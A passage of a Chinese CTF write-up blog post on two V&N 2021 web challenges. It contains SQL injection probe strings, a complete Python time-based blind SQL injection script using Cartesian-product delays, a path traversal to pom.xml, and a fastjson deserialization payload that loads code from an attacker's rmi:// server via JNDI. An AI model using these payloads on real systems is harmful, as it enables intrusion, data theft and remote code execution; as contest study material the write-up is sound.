@@ -1,0 +1,327 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Err0r"><meta name="copyright" content="Err0r"><meta name="generator" content="Hexo 6.3.0"><meta name="theme" content="hexo-theme-yun"><title>V&amp;N2021公开赛 | Err0r</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script><!-- hexo-inject:begin --><!-- hexo-inject:end -->function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"err0r.top","root":"/","title":"云游君的小站","version":"1.10.9","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="Err0r" type="application/atom+xml"><meta name="description" content="比赛昵称：别答了别答了再答人傻了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="V&amp;N2021公开赛">
+<meta property="og:url" content="https://err0r.top/article/VN2021ctf/index.html">
+<meta property="og:site_name" content="Err0r">
+<meta property="og:description" content="比赛昵称：别答了别答了再答人傻了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315121953685.png">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315122233099.png">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315122433276.png">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315122540586.png">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315122714928.png">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315122917856.png">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315142653488.png">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315125931827.png">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315130110417.png">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315135332875.png">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315135240650.png">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315130306763.png">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315130941235.png">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315140129288.png">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315140159832.png">
+<meta property="og:image" content="https://err0r.top/article/VN2021ctf/image-20210315140505582.png">
+<meta property="article:published_time" content="2021-03-15T04:17:51.000Z">
+<meta property="article:modified_time" content="2021-03-30T11:45:23.761Z">
+<meta property="article:author" content="Err0r">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="JAVA">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://err0r.top/article/VN2021ctf/image-20210315121953685.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script><!-- hexo-inject:begin --><!-- hexo-inject:end -->// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Err0r"><img width="96" loading="lazy" src="/yun.png" alt="Err0r"></a><div class="site-author-name"><a href="/about/">Err0r</a></div><a class="site-name" href="/about/site.html">Err0r</a><sub class="site-subtitle">gyy</sub><div class="site-description">gugugu</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">43</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">11</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ez-game"><span class="toc-number">1.1.</span> <span class="toc-text">Ez_game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#realezjvav"><span class="toc-number">1.2.</span> <span class="toc-text">realezjvav</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.1.</span> <span class="toc-text">笛卡尔积延时注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson-lt-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.2.</span> <span class="toc-text">fastjson &lt;1.2.68反序列化漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://err0r.top/article/VN2021ctf/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Err0r"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Err0r"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">V&amp;N2021公开赛</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2021-03-15 12:17:51" itemprop="dateCreated datePublished" datetime="2021-03-15T12:17:51+08:00">2021-03-15</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2021-03-30 19:45:23" itemprop="dateModified" datetime="2021-03-30T19:45:23+08:00">2021-03-30</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Write-Up/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Write-Up</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/SQL/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">SQL</span></a><a class="tag-item" href="/tags/JAVA/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">JAVA</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>比赛昵称：别答了别答了再答人傻了</p>
+<span id="more"></span>
+
+<p>比赛情况：</p>
+<img src="/article/VN2021ctf/image-20210315121953685.png" class="" title="image-20210315121953685" loading="lazy">
+
+
+
+<p>孩子太菜了，后面实在不会做了…</p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h3><p>小游戏题上来就改js</p>
+<img src="/article/VN2021ctf/image-20210315122233099.png" class="" title="image-20210315122233099" loading="lazy">
+
+<p>发现游戏关键函数，直接改数据然后<code>Init()</code>,最好疯狂<code>NextLevel()</code>跳到第10关</p>
+<img src="/article/VN2021ctf/image-20210315122433276.png" class="" title="image-20210315122433276" loading="lazy">
+
+<p>直接从第十关开始，上去撸boss，出flag</p>
+<img src="/article/VN2021ctf/image-20210315122540586.png" class="" title="image-20210315122540586" loading="lazy">
+
+<p>也可以本地保存，直接算js的flag，或者开god模式.<img src="/article/VN2021ctf/image-20210315122714928.png" class="" title="image-20210315122714928" loading="lazy"></p>
+<p>再不行…后面还发现了个函数…<code>boss.Kill()</code></p>
+<hr>
+<h3 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h3><p>hint：我的代码不能注入吧</p>
+<img src="/article/VN2021ctf/image-20210315122917856.png" class="" title="image-20210315122917856" loading="lazy">
+
+<p>打开登陆界面，第一反应注入，冷静下看数据量很少，拿出祖传20w字典爆破。</p>
+<p>再冷静下测试一下，确认是sql注入</p>
+<pre class="language-none"><code class="language-none">username&#x3D;\&amp;password&#x3D;or 1&#x3D;1# ·不报错
+username&#x3D;\&amp;password&#x3D;&#39; ·报错
+username&#x3D;\&amp;password&#x3D;&#39;&#39; ·不报错
+username&#x3D;\&amp;password&#x3D;&#39;# ·不报错
+username&#x3D;\&amp;password&#x3D;&#39;or 1&#x3D;0# ·不报错
+username&#x3D;\&amp;password&#x3D;&#39;or # ·500报错
+username&#x3D;\&amp;password&#x3D;&#39;and if(1,sleep(10),select 1)# ·不报错无延时
+username&#x3D;admin&amp;password&#x3D;&#39;and if(0,sleep(10),select 1)# ·不报错无延时
+发现没啥用...</code></pre>
+
+<p>推测后端为：<code>select * from user where username=&#39;$username&#39; and password=&#39;$password&#39;</code></p>
+<p>过滤了sleep()可能</p>
+<p>这里没回显的就延时注入，<code>sleep()</code>,<code>Benchmark()</code>,或者笛卡尔积</p>
+<h4 id="笛卡尔积延时注入"><a href="#笛卡尔积延时注入" class="headerlink" title="笛卡尔积延时注入"></a>笛卡尔积延时注入</h4><p>当然延时不精确，count(*)数量大时，费时就高，何况比赛机子<strong>极其不稳定</strong>，不清楚是我卡了还是机器卡了。</p>
+<blockquote>
+<p>笛卡尔积延时注入</p>
+<p>count(*)后面所有表中的列笛卡尔积数，数量越多越卡，就会有延迟，类似之前某比赛pgsql的延时注入也可以利用此来打时间差，从而达到延时注入的效果</p>
+<p>参考之前的WP：<a href="/article/cqb2021">春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</a></p>
+<pre class="language-none"><code class="language-none">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;
++-----------+
+| count(*)  |
++-----------+
+| 113101560 |
++-----------+
+1 row in set (2.07 sec)
+
+mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);
++------+-----+
+| user | pwd |
++------+-----+
+| 1    | 0   |
++------+-----+
+1 row in set (2.08 sec)</code></pre>
+</blockquote>
+<p>甚至数量大了把我数据库给跑崩了…</p>
+<img src="/article/VN2021ctf/image-20210315142653488.png" class="" title="image-20210315142653488" loading="lazy">
+
+<p>payload：</p>
+<pre class="language-none"><code class="language-none">-1&#39;and if(&#96;payload&#96;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#</code></pre>
+
+<p>脚本：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""
+-*- coding: utf-8 -*-
+@File: exp.py
+@Author: gyy
+@Time: 3月 14, 2021
+"""</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+<span class="token keyword">import</span> random
+
+url <span class="token operator">=</span> <span class="token string">"http://&#123;&#125;.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login"</span>
+<span class="token comment"># &#123;&#125;由于开了多个靶机，每次随机访问某个靶机，可以减少冲突可能</span>
+
+<span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
+        <span class="token string">"password"</span><span class="token punctuation">:</span> payload
+    <span class="token punctuation">&#125;</span>
+    url1 <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 随机访问</span>
+    <span class="token comment"># print(url1)</span>
+    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment"># 不限制超时</span>
+    <span class="token comment"># print(res.text)</span>
+    <span class="token keyword">if</span> <span class="token string">"504 Gateway Time-out"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span> <span class="token comment"># 504即为正确</span>
+        <span class="token keyword">return</span> <span class="token number">1</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
+
+
+<span class="token keyword">def</span> <span class="token function">binary_search</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 二分法~</span>
+    <span class="token comment"># payload = payload.replace("=",">=")</span>
+    high <span class="token operator">=</span> <span class="token number">127</span>
+    low <span class="token operator">=</span> <span class="token number">32</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>
+            <span class="token keyword">for</span> mid <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> high <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>
+                <span class="token keyword">if</span> req<span class="token punctuation">(</span>payload <span class="token operator">%</span> mid<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
+                    <span class="token keyword">return</span> mid
+            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">+</span> low<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
+        pd <span class="token operator">=</span> payload <span class="token operator">%</span> mid
+        <span class="token keyword">if</span> req<span class="token punctuation">(</span>pd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            high <span class="token operator">=</span> mid
+
+
+<span class="token keyword">def</span> <span class="token function">version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    resultstr <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(version(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
+            i<span class="token punctuation">)</span>
+        <span class="token comment"># 1'and/**/if(ascii(substr(version(),1,1))>64,1,1)like/**/1#</span>
+        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>
+            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">break</span>
+    resultstr <span class="token operator">=</span> <span class="token string">"version==========>"</span> <span class="token operator">+</span> resultstr
+    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    resultstr <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(database(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
+            i<span class="token punctuation">)</span>
+        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>
+            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">break</span>
+    resultstr <span class="token operator">=</span> <span class="token string">"databases==========>"</span> <span class="token operator">+</span> resultstr
+    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>
+<span class="token comment"># databases==========>ctf</span>
+
+<span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    resultstr <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('ctf')),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
+            i<span class="token punctuation">)</span>
+        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>
+            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">break</span>
+    resultstr <span class="token operator">=</span> <span class="token string">"tables==========>"</span> <span class="token operator">+</span> resultstr
+    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>
+<span class="token comment"># tables==========>ctf</span>
+
+<span class="token keyword">def</span> <span class="token function">columns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    resultstr <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># 孩子没跑了，太卡了</span>
+        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>
+            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">break</span>
+    resultstr <span class="token operator">=</span> <span class="token string">"columns==========>"</span> <span class="token operator">+</span> resultstr
+    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    resultstr <span class="token operator">=</span> <span class="token string">" "</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># 孩子没跑了，太卡了</span>
+        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>
+            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">break</span>
+    resultstr <span class="token operator">=</span> <span class="token string">"data==========>"</span> <span class="token operator">+</span> resultstr
+    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    <span class="token comment"># version()</span>
+    <span class="token comment"># database()</span>
+    table<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token comment"># columns()</span>
+    <span class="token comment"># data()</span>
+</code></pre>
+
+<p>孩子实在跑不下去了</p>
+<img src="/article/VN2021ctf/image-20210315125931827.png" class="" title="image-20210315125931827" loading="lazy">
+
+<p>py出题人换了密码<code>no_0ne_kn0w_th1s</code></p>
+<pre class="language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;no_0ne_kn0w_th1s</code></pre>
+
+<p>登录成功</p>
+<img src="/article/VN2021ctf/image-20210315130110417.png" class="" title="image-20210315130110417" loading="lazy">
+
+<p>js加载图片</p>
+<img src="/article/VN2021ctf/image-20210315135332875.png" class="" title="image-20210315135332875" loading="lazy">
+
+<p>发现<code>/searchimage</code>可以目录穿越，读不到flag，可能名字不对，读到了<code>pom.xml</code></p>
+<img src="/article/VN2021ctf/image-20210315135240650.png" class="" title="image-20210315135240650" loading="lazy">
+
+<p>抓包看</p>
+<img src="/article/VN2021ctf/image-20210315130306763.png" class="" title="image-20210315130306763" loading="lazy">
+
+<p>结合应该是fastjson反序列化漏洞</p>
+<h4 id="fastjson-lt-1-2-68反序列化漏洞"><a href="#fastjson-lt-1-2-68反序列化漏洞" class="headerlink" title="fastjson &lt;1.2.68反序列化漏洞"></a>fastjson &lt;1.2.68反序列化漏洞</h4><p>直接payload试一下，被ban了</p>
+<img src="/article/VN2021ctf/image-20210315130941235.png" class="" title="image-20210315130941235" loading="lazy">
+
+<p>需要绕过，JSONObject.parseObject()会自动会把json字符串中的Unicode码进行转换，所以转成Unicode即可</p>
+<p>服务器起 <a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></p>
+<p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;payload&quot; -A ip</code></p>
+<img src="/article/VN2021ctf/image-20210315140129288.png" class="" title="image-20210315140129288" loading="lazy">
+
+<p>再起监听端口</p>
+<p>最后打payload</p>
+<pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span>
+	<span class="token property">"e"</span><span class="token operator">:</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
+		<span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
+	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+	<span class="token property">"name"</span><span class="token operator">:</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
+		<span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span>
+		<span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
